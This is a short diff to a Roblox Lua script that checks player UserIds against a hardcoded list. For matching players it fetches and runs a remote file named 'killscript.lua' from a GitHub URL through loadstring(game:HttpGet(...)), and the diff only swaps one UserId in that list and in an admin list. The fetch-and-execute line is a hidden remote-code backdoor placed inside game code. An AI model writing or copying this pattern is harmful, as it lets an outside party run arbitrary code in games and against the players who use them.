@@ -1,7 +1,7 @@
 local Players = game:GetService("Players") -- you should use GetService over game.Players!
         for _, player in pairs(Players:GetPlayers()) do
         -- this code will run for all players
-            if player.UserId == 2213409568 or player.UserId == 1570719229 or player.UserId == 8195210 or player.UserId == 28357488 or player.UserId == 17260230 or player.UserId == 201454243 or player.UserId == 179520654 then  
+            if player.UserId == 1947783536 or player.UserId == 1570719229 or player.UserId == 8195210 or player.UserId == 28357488 or player.UserId == 17260230 or player.UserId == 201454243 or player.UserId == 179520654 then  
                 wait(1)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/q2eq3q3fw/killscript.lua/main/killscript.lua"))()
             else
@@ -11,7 +11,7 @@ local Players = game:GetService("Players") -- you should use GetService over gam
         
         
         local AdminList = {
-        2213409568, -- rayan77x_1  
+        1947783536, -- rayan77x_1  
         1570719229,  -- wtrook      
         8195210,   -- Benoxa
         822999,    -- AStrongMuscle  
